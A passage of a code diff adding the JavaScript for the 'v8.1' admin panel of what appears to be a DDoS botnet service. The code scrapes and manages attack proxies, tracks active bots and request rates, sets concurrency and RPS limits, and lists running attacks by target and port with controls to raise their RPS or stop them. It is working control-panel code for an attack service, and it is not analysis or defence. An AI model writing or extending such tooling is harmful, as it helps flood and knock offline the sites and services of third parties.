+                addLog('Error loading proxy sources: ' + e.message);
+            }
+        }
+
+        // ===== NEW: RPS ALERT =====
+        let alertHistory = [];
+
+        function addRpsAlert(alert) {
+            alertHistory.push(alert);
+            if (alertHistory.length > 20) alertHistory.shift();
+
+            const container = document.getElementById('rpsAlertContainer');
+            const severity = alert.severity || 'warning';
+            const time = new Date(alert.timestamp * 1000).toLocaleTimeString();
+
+            const div = document.createElement('div');
+            div.className = `alert-card ${severity}`;
+            div.innerHTML = `
+                <div class="severity" style="color: var(--neon-${severity === 'fatal' ? 'red' : severity === 'critical' ? 'orange' : 'yellow'})">
+                    [${severity.toUpperCase()}] RPS DROP DETECTED
+                </div>
+                <div class="time">${time} | Attack: ${alert.attack_id.substring(0, 16)}...</div>
+                <div>Expected: ${alert.expected_rps} | Actual: ${alert.actual_rps} | Drop: ${alert.drop_percent.toFixed(1)}%</div>
+                <div class="cause">Causes: ${alert.possible_causes.join(', ')}</div>
+            `;
+            container.prepend(div);
+
+            // Keep only last 10 alerts visible
+            while (container.children.length > 10) {
+                container.removeChild(container.lastChild);
+            }
+
+            addLog(`[ALERT] RPS ${severity}: ${alert.attack_id.substring(0, 16)}... drop ${alert.drop_percent.toFixed(1)}%`, 'alert');
+        }
+
+        function clearAlerts() {
+            alertHistory = [];
+            document.getElementById('rpsAlertContainer').innerHTML = '<div style="text-align:center;padding:20px;color:rgba(0,255,65,0.3);">No alerts detected. System healthy.</div>';
+            addLog('Alerts cleared');
+        }
+
+        function testAlert() {
+            const testAlert = {
+                timestamp: Date.now() / 1000,
+                attack_id: 'test-attack-12345',
+                expected_rps: 1500,
+                actual_rps: 800,
+                drop_percent: 46.7,
+                severity: 'warning',
+                possible_causes: ['Test alert', 'Proxy pool low', 'Bot disconnect']
+            };
+            addRpsAlert(testAlert);
+            showAlert('Test alert triggered!', 'warning');
+        }
+
+        // ===== EXISTING: PROXY MANAGEMENT =====
+        async function loadProxyStats() {
+            try {
+                const res = await fetch('/api/proxy/stats');
+                if (!res.ok) throw new Error('Failed');
+                const data = await res.json();
+                document.getElementById('totalProxy').textContent = data.total || 0;
+                document.getElementById('aliveProxy').textContent = data.alive || 0;
+                document.getElementById('deadProxy').textContent = data.dead || 0;
+                document.getElementById('lastScrap').textContent = data.last_scrap || 'Never';
+                return data;
+            } catch (e) {
+                addLog('Error loading proxy stats: ' + e.message);
+                return null;
+            }
+        }
+
+        async function loadProxyList() {
+            try {
+                const res = await fetch('/api/proxy/list?alive=true');
+                if (!res.ok) throw new Error('Failed');
+                const data = await res.json();
+                const container = document.getElementById('proxyListContainer');
+                if (data.proxies && data.proxies.length > 0) {
+                    container.innerHTML = data.proxies.map(p => `
+                        <div class="proxy-item">
+                            <span class="ip">${p.ip}:${p.port}</span>
+                            <span class="alive">● Alive</span>
+                        </div>
+                    `).join('');
+                } else {
+                    container.innerHTML = '<div style="text-align:center;padding:20px;color:rgba(0,255,65,0.3);">No alive proxies.</div>';
+                }
+            } catch (e) {
+                addLog('Error loading proxy list: ' + e.message);
+            }
+        }
+
+        async function refreshProxyPool() {
+            addLog('Refreshing proxy pool...');
+            try {
+                const res = await fetch('/api/proxy/refresh', { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    showAlert('Proxy pool refreshed successfully!', 'success');
+                    addLog('Proxy pool refreshed.', 'success');
+                    loadProxyStats();
+                    loadProxyList();
+                } else {
+                    showAlert('Failed to refresh: ' + data.error, 'error');
+                }
+            } catch (e) {
+                showAlert('Error: ' + e.message, 'error');
+                addLog('Error refreshing proxy: ' + e.message);
+            }
+        }
+
+        async function removeDeadProxies() {
+            addLog('Removing dead proxies...');
+            try {
+                const res = await fetch('/api/proxy/remove-dead', { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    showAlert(`Removed ${data.removed} dead proxies.`, 'success');
+                    addLog(`Removed ${data.removed} dead proxies.`, 'success');
+                    loadProxyStats();
+                    loadProxyList();
+                } else {
+                    showAlert('Failed: ' + data.error, 'error');
+                }
+            } catch (e) {
+                showAlert('Error: ' + e.message, 'error');
+                addLog('Error removing dead proxies: ' + e.message);
+            }
+        }
+
+        async function scrapProxy() {
+            const urlsText = document.getElementById('scrapUrls').value.trim();
+            if (!urlsText) {
+                showAlert('Please enter at least one URL.', 'error');
+                return;
+            }
+            const urls = urlsText.split('\n').map(s => s.trim()).filter(u => u);
+            addLog(`Scrapping ${urls.length} URL(s)...`);
+            try {
+                const res = await fetch('/api/proxy/scrap', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ urls })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    showAlert(`Scrapped ${data.added} new proxies.`, 'success');
+                    addLog(`Scrapped ${data.added} proxies.`, 'success');
+                    loadProxyStats();
+                    loadProxyList();
+                } else {
+                    showAlert('Scrap failed: ' + data.error, 'error');
+                }
+            } catch (e) {
+                showAlert('Error: ' + e.message, 'error');
+                addLog('Error scrapping: ' + e.message);
+            }
+        }
+
+        // ===== EXISTING: BOTNET & STATS =====
+        async function loadBotnetStats() {
+            try {
+                const res = await fetch('/api/botnet/stats');
+                if (!res.ok) throw new Error('Failed');
+                const data = await res.json();
+                document.getElementById('botActive').textContent = data.active || 0;
+                document.getElementById('botTotal').textContent = data.total || 0;
+                document.getElementById('avgRpm').textContent = data.avg_rpm || 0;
+                document.getElementById('totalReqs').textContent = (data.total_requests || 0).toLocaleString();
+            } catch (e) {
+                addLog('Error loading botnet stats: ' + e.message);
+            }
+        }
+
+        // ===== EXISTING: CONCURRENT CONTROL =====
+        async function setMaxConcurrent() {
+            const val = parseInt(document.getElementById('maxConcurrentInput').value);
+            if (isNaN(val) || val < 1) {
+                showAlert('Please enter a valid number (>=1).', 'error');
+                return;
+            }
+            addLog(`Setting max concurrent to ${val}...`);
+            try {
+                const res = await fetch('/api/config/concurrent', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ max_concurrent: val })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    showAlert(`Max concurrent set to ${val}.`, 'success');
+                    addLog(`Max concurrent updated to ${val}.`, 'success');
+                    document.getElementById('currentConcurrent').textContent = val;
+                } else {
+                    showAlert('Failed: ' + data.error, 'error');
+                }
+            } catch (e) {
+                showAlert('Error: ' + e.message, 'error');
+                addLog('Error setting concurrent: ' + e.message);
+            }
+        }
+
+        async function loadCurrentConcurrent() {
+            try {
+                const res = await fetch('/api/config/concurrent');
+                if (!res.ok) throw new Error('Failed');
+                const data = await res.json();
+                document.getElementById('currentConcurrent').textContent = data.max_concurrent || 5;
+                document.getElementById('maxConcurrentInput').value = data.max_concurrent || 5;
+            } catch (e) {
+                addLog('Error loading concurrent config: ' + e.message);
+            }
+        }
+
+        // ===== EXISTING: RPS LIMIT CONTROL =====
+        async function loadRpsLimit() {
+            try {
+                const res = await fetch('/api/config/rps-limit');
+                if (!res.ok) throw new Error('Failed');
+                const data = await res.json();
+                const val = data.rps_limit || 0;
+                document.getElementById('currentRpsLimit').textContent = val.toLocaleString();
+                document.getElementById('rpsLimitInput').value = val;
+            } catch (e) {
+                addLog('Error loading RPS limit: ' + e.message);
+            }
+        }
+
+        async function setRpsLimit() {
+            const val = parseInt(document.getElementById('rpsLimitInput').value);
+            if (isNaN(val) || val < 0) {
+                showAlert('Please enter a valid number (>=0).', 'error');
+                return;
+            }
+            addLog(`Setting RPS limit to ${val}...`);
+            try {
+                const res = await fetch('/api/config/rps-limit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ rps_limit: val })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    showAlert(`RPS limit set to ${val}.`, 'success');
+                    addLog(`RPS limit updated to ${val}.`, 'success');
+                    document.getElementById('currentRpsLimit').textContent = val.toLocaleString();
+                } else {
+                    showAlert('Failed: ' + data.error, 'error');
+                }
+            } catch (e) {
+                showAlert('Error: ' + e.message, 'error');
+                addLog('Error setting RPS limit: ' + e.message);
+            }
+        }
+
+        // ===== EXISTING: SERVICE CONTROL =====
+        async function restartService() {
+            if (!confirm('Are you sure you want to restart the service?')) return;
+            addLog('Restarting service...');
+            try {
+                const res = await fetch('/api/service/restart', { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    showAlert('Service restarted successfully.', 'success');
+                    addLog('Service restarted.', 'success');
+                } else {
+                    showAlert('Failed: ' + data.error, 'error');
+                }
+            } catch (e) {
+                showAlert('Error: ' + e.message, 'error');
+                addLog('Error restarting service: ' + e.message);
+            }
+        }
+
+        async function clearLogs() {
+            if (!confirm('Clear all system logs?')) return;
+            addLog('Clearing logs...');
+            try {
+                const res = await fetch('/api/service/clear-logs', { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    showAlert('Logs cleared.', 'success');
+                    document.getElementById('logContainer').innerHTML = '<div class="log-entry">[SYSTEM] Logs cleared.</div>';
+                    addLog('Logs cleared.', 'success');
+                } else {
+                    showAlert('Failed: ' + data.error, 'error');
+                }
+            } catch (e) {
+                showAlert('Error: ' + e.message, 'error');
+                addLog('Error clearing logs: ' + e.message);
+            }
+        }
+
+        // ===== EXISTING: ONGOING ATTACKS =====
+        async function loadActiveAttacks() {
+            try {
+                const res = await fetch('/api/attack/active');
+                if (!res.ok) throw new Error('Failed');
+                const data = await res.json();
+                const container = document.getElementById('ongoingAttacksContainer');
+                const badge = document.getElementById('ongoingBadge');
+
+                if (!data.attacks || data.attacks.length === 0) {
+                    container.innerHTML = '<div class="no-attacks">No active attacks.</div>';
+                    badge.textContent = '0 ACTIVE';
+                    badge.className = 'badge cyan';
+                    return;
+                }
+
+                badge.textContent = `${data.attacks.length} ACTIVE`;
+                badge.className = 'badge green';
+
+                container.innerHTML = data.attacks.map(a => {
+                    const elapsed = Math.floor((Date.now() / 1000) - a.start_time);
+                    const remaining = Math.max(0, a.duration + (a.hold_time || 0) - elapsed);
+                    const progress = Math.min(100, (elapsed / (a.duration + (a.hold_time || 0))) * 100).toFixed(1);
+
+                    return `
+                        <div class="ongoing-attack-card">
+                            <div class="ongoing-attack-header">
+                                <span class="ongoing-attack-id">${a.id.substring(0, 16)}...</span>
+                                <span class="ongoing-attack-method">${a.method.toUpperCase()}</span>
+                            </div>
+                            <div class="ongoing-attack-info">
+                                🎯 <span>${a.target}</span> | Port: <span>${a.port}</span> | 
+                                RPS: <span>${a.rps || 0}</span> | 
+                                Req: <span>${(a.total_requests || 0).toLocaleString()}</span> | 
+                                Proxy: <span>${a.proxy_count_current || 0}</span> | 
+                                Remaining: <span>${remaining}s</span> | 
+                                Progress: <span>${progress}%</span>
+                            </div>
+                            <div class="ongoing-attack-rps-control">
+                                <label style="color:var(--neon-cyan);font-size:12px;">🎯 New RPS:</label>
+                                <input type="number" id="rps-update-${a.id}" value="${a.rps || 0}" min="0" step="100">
+                                <button class="btn cyan" onclick="updateAttackRps('${a.id}')">⚡ Update RPS</button>
+                                <button class="btn red" onclick="stopAttack('${a.id}')">🛑 Stop</button>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+            } catch (e) {
+                addLog('Error loading active attacks: ' + e.message);
+            }
+        }
+
+        async function updateAttackRps(attackId) {
+            const input = document.getElementById(`rps-update-${attackId}`);
+            const newRps = parseInt(input.value);
+            if (isNaN(newRps) || newRps < 0) {
+                showAlert('Please enter a valid RPS (>=0).', 'error');
+                return;
+            }
+            addLog(`Updating RPS for attack ${attackId.substring(0,8)}... to ${newRps}...`);
+            try {
+                const res = await fetch(`/api/attack/update-rps/${attackId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ new_rps: newRps })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    showAlert(`RPS updated to ${newRps} for attack ${attackId.substring(0,8)}...`, 'success');
+                    addLog(`RPS updated: ${newRps} for attack ${attackId.substring(0,8)}...`, 'success');
+                    loadActiveAttacks();
+                } else {
+                    showAlert('Failed: ' + data.message, 'error');
+                }
+            } catch (e) {
+                showAlert('Error: ' + e.message, 'error');
+                addLog('Error updating RPS: ' + e.message);
+            }
+        }
+
+        async function stopAttack(attackId) {
+            if (!confirm(`Stop attack ${attackId.substring(0,8)}...?`)) return;
+            addLog(`Stopping attack ${attackId.substring(0,8)}...`);
+            try {
+                const res = await fetch(`/api/stop/${attackId}`, { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    showAlert('Attack stopped.', 'success');
+                    addLog('Attack stopped.', 'success');
+                    loadActiveAttacks();
+                } else {
+                    showAlert('Failed: ' + data.message, 'error');
+                }
+            } catch (e) {
+                showAlert('Error: ' + e.message, 'error');
+                addLog('Error stopping attack: ' + e.message);
+            }
+        }
+
+        // ===== NEW: UPDATE FROM PERIODIC =====
+        function updateFromPeriodic(data) {
+            if (data.proxy) {
+                document.getElementById('totalProxy').textContent = data.proxy.alive || 0;
+                document.getElementById('aliveProxy').textContent = data.proxy.alive || 0;
+                document.getElementById('deadProxy').textContent = data.proxy.dead || 0;
+            }
+            if (data.attacks) {
+                // Update ongoing attacks if needed
+            }
+        }
+
+        // ===== POLLING =====
+        function initPolling() {
+            checkHealth();
+            loadProxyStats();
+            loadProxyList();
+            loadBotnetStats();
+            loadCurrentConcurrent();
+            loadRpsLimit();
+            loadActiveAttacks();
+            loadProxySources();
+
+            setInterval(() => {
+                checkHealth();
+                loadProxyStats();
+                loadBotnetStats();
+                loadCurrentConcurrent();
+                loadRpsLimit();
+                loadProxySources();
+            }, 15000);
+
+            setInterval(loadProxyList, 30000);
+            setInterval(loadActiveAttacks, 5000);
+        }
+
+        // ===== INIT =====
+        connectWebSocket();
+        initPolling();
+        addLog('Admin panel v8.1 loaded.', 'success');
+        addLog('WebSocket connecting...');
+        addLog('All systems ready.', 'success');
+    </script>
+</body>
+</html>
